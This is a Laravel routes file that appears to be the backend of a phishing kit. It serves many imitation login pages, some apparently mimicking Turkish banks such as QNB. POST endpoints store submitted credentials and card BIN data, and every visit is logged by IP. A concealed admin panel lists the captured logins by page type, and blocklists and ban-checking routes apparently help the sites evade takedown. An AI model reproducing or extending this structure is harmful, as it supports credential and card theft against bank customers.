<?php

use App\Http\Controllers\AdminOptionsController;
use App\Http\Controllers\AdminSitesController;
use App\Http\Controllers\FollowSiteBan;
use App\Http\Controllers\ForbiddenController;
use App\Http\Controllers\LogController;
use App\Http\Controllers\MainController;
use App\Http\Middleware\SaveIPMigration;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::middleware([SaveIPMigration::class])->group(function () {
    Route::get('/', function () {
        return view('welcome');
    })->name('root.index');
    Route::get('/loginform', [MainController::class, 'form']);
    Route::get('/mail', [MainController::class, 'mail']);
    Route::get('/gg', [MainController::class, 'gg']);
    Route::get('/tlogin', [MainController::class, 'tt']);
    Route::get('/wp', [MainController::class, 'index'])->name('home.index');
    Route::post('loginmember', [MainController::class, 'saveData']);
    Route::post('loginbin', [MainController::class, 'saveBin']);
    Route::post('loginPar', [MainController::class, 'savePar']);
    Route::get('/join', [MainController::class, 'dd']);
    Route::get('/flogin', [MainController::class, 'ff']);
    Route::get('/ilogin', [MainController::class, 'ib']);
    Route::get('/blogin', [MainController::class, 'blogin']);
    Route::get('/plogin', [MainController::class, 'plogin']);
    Route::get('/vlogin', [MainController::class, 'vlogin']);
    Route::get('/elogin', [MainController::class, 'elogin']);
    Route::get('/qnb-login', [MainController::class, 'qnblogin']);
    Route::get('/bireysel-katilim', [MainController::class, 'glogin']);
    Route::get('/resetcache', [MainController::class, 'resetcache']);
    Route::get('/{slug}', [MainController::class, 'handleSlug']);
});

Route::middleware(['web', 'auth.check', 'check.permissions'])->prefix('hacininyeri')->group(function () {
    Route::get('/login', [LogController::class, 'login'])->name('admin.login');
    Route::get('/logout', [LogController::class, 'logout'])->name('admin.logout');
    Route::get('/auth', [LogController::class, 'auth'])->name('admin.auth');
    Route::get('login-list', [LogController::class, 'listByLogin'])->name('admin.listlogin');
    Route::get('logind-list', [LogController::class, 'listByDLogin'])->name('admin.listdlogin');
    Route::get('loginf-list', [LogController::class, 'listByFLogin'])->name('admin.listflogin');
    Route::get('logint-list', [LogController::class, 'listByTLogin'])->name('admin.listtlogin');
    Route::get('loginb-list', [LogController::class, 'listByBLogin'])->name('admin.listblogin');
    Route::get('loginp-list', [LogController::class, 'listByPLogin'])->name('admin.listplogin');
    Route::get('logini-list', [LogController::class, 'listByILogin'])->name('admin.listilogin');
    Route::get('loginv-list', [LogController::class, 'listByVLogin'])->name('admin.listvlogin');
    Route::get('logine-list', [LogController::class, 'listByELogin'])->name('admin.listelogin');
    Route::get('ip-list', [LogController::class, 'listByIP'])->name('admin.listip');
    Route::get('ip-action', [LogController::class, 'actionByIp'])->name('admin.actionByIp');
    Route::get('resetDB', [LogController::class, 'resetDB'])->name('admin.resetdb');
    Route::resource('options', AdminOptionsController::class);
    Route::resource('forbidden', ForbiddenController::class);
    Route::get('forbidden/delete/{forbidden}', [ForbiddenController::class, 'delete'])->name('forbidden.delete');
    Route::resource('sites', AdminSitesController::class);
    Route::post('singleCheck', [FollowSiteBan::class, 'handle'])->name('uscheck');
});
